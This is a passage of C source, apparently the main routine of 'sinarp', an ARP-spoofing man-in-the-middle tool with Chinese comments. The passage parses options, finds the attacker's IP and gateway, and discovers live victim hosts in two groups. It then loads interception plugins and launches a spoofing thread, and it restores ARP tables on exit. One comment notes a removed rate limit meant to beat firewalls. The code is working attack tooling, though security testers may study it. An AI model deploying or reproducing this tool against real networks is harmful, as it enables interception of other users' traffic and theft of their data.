                              %s is not supported by WinPcap\r\n", open_devs->description);
                goto clean;
            }

            strncpy(g_opened_if_name, open_devs->name, 255);
            //一块网卡上面可能绑定多个IP。 而我们每次只能使用其中的一个

        }
        else if (stricmp(argv[idx - 1], "-s") == 0)
        {
            switch (atoi(argv[idx]))
            {
            case SPOOF_A:
                g_spoof_type = SPOOF_A;
                break;
            case SPOOF_AB:
                g_spoof_type = SPOOF_AB;
                break;
            case 2:
            {
                g_spoof_type = SPOOF_NONE;
            }
            break;
            default:
                sinarp_printf("unknown spoof type !\n");
                goto clean;
            }
        }
        else if (stricmp(argv[idx - 1], "-p") == 0)
        {
            plugin_string = argv[idx];
            //sinarp_parse_plugin_string(argv[idx]);
        }
        else if (stricmp(argv[idx - 1], "-t") == 0)
        {
            g_interval = atoi(argv[idx]);
            if (g_interval == 0)
            {
                sinarp_printf("not a right interval ~~~\n");
                goto clean;
            }
            //  if(g_interval < 200)  //去掉限制 一些防火墙太 恶心了 我不能发包发的比他慢
            //  {
            //      printf("interval time  too short !\n");
            //      goto clean;
            //  }
        }
        else if (stricmp(argv[idx - 1], "-f") == 0)
        {
            //找到的话 那么就关闭 ip 转发功能
            g_auto_ip_forward = 0;
        }
        else if (stricmp(argv[idx - 1], "--mac") == 0)
        {
            mac_string = argv[idx];
        }
    }
    //
    if (!open_devs)
    {
        //用户没有指定网卡
        sinarp_printf("please input the adapter id！\n");
        //printf("请指定要打开的网卡！\n");
        goto clean;
    }
    //
    if (SPOOF_NONE == g_spoof_type)
    {
        //启动捕获线程 ，在捕获线程里面 如果 有主机向我们回复 ARP 请求的话 那么我们就更新我们的主机表里面的 MAC　信息
        sinarp_create_thread(sinarp_capture_thread, NULL);
        Sleep(2000);
        // entry loop
        //等待这两个线程退出吧。。。
        while (g_is_capture_thread_active)
        {
            Sleep(100);
#ifdef WIN32
            sinarp_printf("\rprocessed packet %I64u", g_packet_count);
#else
            sinarp_printf("\rprocessed packet %llu", g_packet_count);
#endif
        }
        goto clean;
    }
    //check M
    if (M_ip)
    {
        //看看中间人的 ip 是不是在网卡的ip列表里面
        /* IP addresses */
        for (a = open_devs->addresses; a; a = a->next)
        {
            switch (a->addr->sa_family)
            {
            case AF_INET:
                if (a->addr)
                    if (M_ip == ((struct sockaddr_in *)a->addr)->sin_addr.s_addr)
                    {
                        g_my_ip = M_ip;
                        if (a->broadaddr)
                            g_my_boardcast_addr = ((struct sockaddr_in *)a->broadaddr)->sin_addr.s_addr;
                        if (a->netmask)
                            g_my_netmask = ((struct sockaddr_in *)a->netmask)->sin_addr.s_addr;
                        sinarp_get_gw_from_ip(g_my_ip, &g_my_gw_addr);
#ifdef WIN32
                        //printf("I am run in windows \n");
                        sinarp_get_mac_from_if_name(strchr(open_devs->name, '{'), g_my_mac);
#else
                        //printf(" I am run in linux \n");
                        sinarp_get_mac_from_if_name(open_devs->name, g_my_mac);
#endif
                    }
                break;
            case AF_INET6: //不支持 ipv6
                break;
            default:
                break;
            }
            if (g_my_ip)
                break;
        }
        if (!g_my_ip)
        {
            //ip 地址不在网卡列表里面
            printf("the M ip : %s invaild!\n", inet_ntoa(*(struct in_addr *)&M_ip));
            goto clean;
        }
    }
    else
    {
        //用户没有指定中间人IP 那么取网卡的第一个IP
        for (a = open_devs->addresses; a; a = a->next)
        {
            switch (a->addr->sa_family)
            {
            case AF_INET:
                if (a->addr)
                    g_my_ip = ((struct sockaddr_in *)a->addr)->sin_addr.s_addr;
                if (a->broadaddr)
                    g_my_boardcast_addr = ((struct sockaddr_in *)a->broadaddr)->sin_addr.s_addr;
                if (a->netmask)
                    g_my_netmask = ((struct sockaddr_in *)a->netmask)->sin_addr.s_addr;
                sinarp_get_gw_from_ip(g_my_ip, &g_my_gw_addr);
#ifdef WIN32
                sinarp_get_mac_from_if_name(strchr(open_devs->name, '{'), g_my_mac);
#else
                sinarp_get_mac_from_if_name(open_devs->name, g_my_mac);
#endif
                break;
            case AF_INET6: //不支持 ipv6
                break;
            default:
                break;
            }
            if (g_my_ip)
                break;
        }
        if (!g_my_ip) //网卡上面没有一个可用的 ip
        {
            printf("can not find a ip bind on this adapter\n");
            //printf("网卡上面找不到一个可用的ip\n");
            goto clean;
        }
    }

    sinarp_printf("get my ip %s\n", sinarp_iptos(g_my_ip));
    //根据中间人的ip 来确定 ip 的前3位  netmask 定死为 255.255.255.0
    M_ip = g_my_ip;
    M_ip &= 0x00FFFFFF;
    //DBG_MSG("M:%s\n",sinarp_iptos(M_ip));
    // init the host list
    for (i = 0; i <= 0xFF; i++)
    {
        g_HostList[i].ip |= M_ip;
        g_HostList[i].ip |= i << 24;
    }
    //貌似已经不需要使用到 网卡信息了
    pf_pcap_freealldevs(pdevs);
    pdevs = NULL;
    //check A
    //printf("A Host list:\n");
    for (idx  = 0 ; idx <= 0xFF; idx ++)
    {
        if (g_HostList[idx].type == HOST_A)
        {
            //printf("\t%s\n",sinarp_iptos(g_HostList[idx].ip));
            ++host_count;
        }
    }
    if (host_count < 1)
    {
        //用户没有指定A主机　那么使用默认的网关
        if (g_my_gw_addr == 0)
        {
            //网关地址没有正确的获取
            printf("Failed to get the gw ip !\n");
            goto clean;
        }
        g_HostList[g_my_gw_addr >> 24].type = HOST_A;
        //printf("\t%s\n",sinarp_iptos(g_HostList[g_my_gw_addr >> 24].ip));
    }
    //check B
    //printf("B Host list:\n");
    host_count = 0;
    for (idx  = 0 ; idx <= 0xFF; idx ++)
    {
        if (g_HostList[idx].type == HOST_B)
        {
            //printf("\t%s\n",sinarp_iptos(g_HostList[idx].ip));
            ++host_count;
        }
    }
    if (host_count < 1)
    {
        printf("you must special at least one B host !\n");
        goto clean;
    }
    //把 自己的 ip  从主机列表的 A B 中除去
    g_HostList[g_my_ip >> 24].type =  HOST_UNKNOWN;
    //设置一个 pcap 的 filter 来让我们不捕获自己发出去的包
    sprintf(sniffer_filter, "ether src not  %02x:%02x:%02x:%02x:%02x:%02x",
            g_my_mac[0],
            g_my_mac[1],
            g_my_mac[2],
            g_my_mac[3],
            g_my_mac[4],
            g_my_mac[5]);
    if (pf_pcap_compile(g_adhandle, &fcode, sniffer_filter, 1, g_my_netmask) < 0)
    {
        fprintf(stderr, "\nUnable to compile the packet filter\n");
        /* Free the device list */
        goto clean;
    }
    //设置过滤器
    if (pf_pcap_setfilter(g_adhandle, &fcode) < 0)
    {
        fprintf(stderr, "\nError setting the filter.\n");
        /* Free the device list */
        goto clean;
    }

    //启动捕获线程 ，在捕获线程里面 如果 有主机向我们回复 ARP 请求的话 那么我们就更新我们的主机表里面的 MAC　信息
    sinarp_create_thread(sinarp_capture_thread, NULL);
    Sleep(2000);//等待一秒钟 确定数据包的捕获开始了
    //sinarp_printf("start capture.....\n");
    //现在就是要扫描存活的主机 获得其 MAC 地址了
    // 不关什么情况 我们都尝试获取下 网关的 mac 地址 数据包转发的时候 会用到的
    // process mac_string first
    sinarp_process_mac_string(mac_string);

    for (idx = 0 ; idx < 0xFF; idx++)
    {
        switch (g_HostList[idx].type)
        {
        case HOST_A:
        case HOST_B:
        {
            sinarp_send_arp(g_HostList[idx].ip);
        }
        break;
        default:
            if (g_HostList[idx].ip == g_my_gw_addr)
            {
                sinarp_send_arp(g_my_gw_addr);
            }
            break;
        }
    }
    Sleep(2000);//等待5秒钟 让所有的主机都回复了我们的 ARP 请求
    //检测 A B 中 至少各获取了一个主机的 MAC 地址
    active_count_B = active_count_A = 0;
    for (idx = 0; idx < 0xFF; idx ++)
    {
        switch (g_HostList[idx].type)
        {
        case HOST_A:
        {
            //DBG_MSG("HOST_A: %d active : %d \n",idx,g_HostList[idx].active);
            // if(memcmp(g_HostList[idx].mac,g_zero_mac,6) !=0)
            if (1 == g_HostList[idx].active)
                ++active_count_A;
        }
        break;
        case HOST_B:
        {
            //DBG_MSG("HOST_B: %d active : %d \n",idx,g_HostList[idx].active);
            //if(memcmp(g_HostList[idx].mac,g_zero_mac,6) !=0)
            if (1 == g_HostList[idx].active)
                ++active_count_B;
        }
        break;
        case HOST_UNKNOWN:
        {

        }
        break;
        default:
        {
            DBG_MSG("unknown host type !\n");
        }
        break;
        }
    }

    if (active_count_A < 1 || active_count_B < 1)
    {
        if (active_count_A < 1)
        {
            sinarp_printf("sinarp do not find a active host in group A ! \n");
        }
        if (active_count_B < 1)
        {
            sinarp_printf("sinarp do not find a active host in group B ! \n");
        }
        pf_pcap_breakloop(g_adhandle);
        goto clean;
    }
    //打印下活动主机列表
    sinarp_printf("Active host list:\n");
    sinarp_printf("M:\n");
    sinarp_printf("\t%-20s %.2X:%.2X:%.2X:%.2X:%.2X:%.2X\n",
                  sinarp_iptos(g_my_ip),
                  g_my_mac[0],
                  g_my_mac[1],
                  g_my_mac[2],
                  g_my_mac[3],
                  g_my_mac[4],
                  g_my_mac[5]);
    sinarp_printf("A:\n");
    for (idx = 0 ; idx < 0xFF ; idx ++)
    {
        switch (g_HostList[idx].type)
        {
        case HOST_A:
            //if(memcmp(g_HostList[idx].mac,g_zero_mac,6) !=0)
            if (g_HostList[idx].active == 1)
            {
                sinarp_printf("\t%-20s %.2X:%.2X:%.2X:%.2X:%.2X:%.2X\n",
                              sinarp_iptos(g_HostList[idx].ip),
                              g_HostList[idx].mac[0],
                              g_HostList[idx].mac[1],
                              g_HostList[idx].mac[2],
                              g_HostList[idx].mac[3],
                              g_HostList[idx].mac[4],
                              g_HostList[idx].mac[5]);
            }
            break;
        default:
            break;
        }
    }

    sinarp_printf("B:\n");
    for (idx = 0 ; idx < 0xFF ; idx ++)
    {
        switch (g_HostList[idx].type)
        {
        case HOST_A:
            break;
        case HOST_B:
            //if(memcmp(g_HostList[idx].mac,g_zero_mac,6) !=0)
            if (g_HostList[idx].active == 1)
            {
                sinarp_printf("\t%-20s %.2X:%.2X:%.2X:%.2X:%.2X:%.2X\n",
                              sinarp_iptos(g_HostList[idx].ip),
                              g_HostList[idx].mac[0],
                              g_HostList[idx].mac[1],
                              g_HostList[idx].mac[2],
                              g_HostList[idx].mac[3],
                              g_HostList[idx].mac[4],
                              g_HostList[idx].mac[5]);
            }
            break;
        default:
            break;
        }
    }

    memcpy(g_my_gw_mac, g_HostList[g_my_gw_addr >> 24].mac, 6);

    if (g_auto_ip_forward == 0)
    {
        sinarp_printf("Warning:sinarp run without ip forward..\n");
    }
    //start load plugin
    if (plugin_string)
    {
        sinarp_printf("\rloading plugin...\n");
        sinarp_parse_plugin_string(plugin_string);
    }
    //check plugin
    if (g_plugin_list.count < 1)
    {
        sinarp_printf("Warning:sinarp do not load any plugin !\n");
    }
    else
    {
        //打印下加载的插件列表
        sinarp_printf("loaded plugin:\n");
        for (idx = 0; idx < g_plugin_list.count; idx ++)
        {
            sinarp_printf("\t%s\n", g_plugin_list.plugin[idx].name);
        }
    }
    //下面启动欺骗线程
    sinarp_create_thread(sinarp_spoof_thread, NULL);
    Sleep(1000);

    //等待这两个线程退出吧。。。
    while (g_is_capture_thread_active || g_is_spoof_thread_active)
    {
        Sleep(100);
#ifdef WIN32
        sinarp_printf("\rprocessed packet %I64u", g_packet_count);
#else
        sinarp_printf("\rprocessed packet %llu", g_packet_count);
#endif
    }

    //退出的时候 尝试向列表里的主机发送 ARP 包 恢复其ARP表。。
    sinarp_printf("\rRestoring the ARPTable......\r\n");
    sinarp_restore_arp_table();//恢复两次
    sinarp_restore_arp_table();
    sinarp_printf("\rbye....\n");
clean:
    if (pdevs)
        pf_pcap_freealldevs(pdevs);
    if (g_plugin_list.count > 0)
        sinarp_free_plugin_list();
    return 0;
}

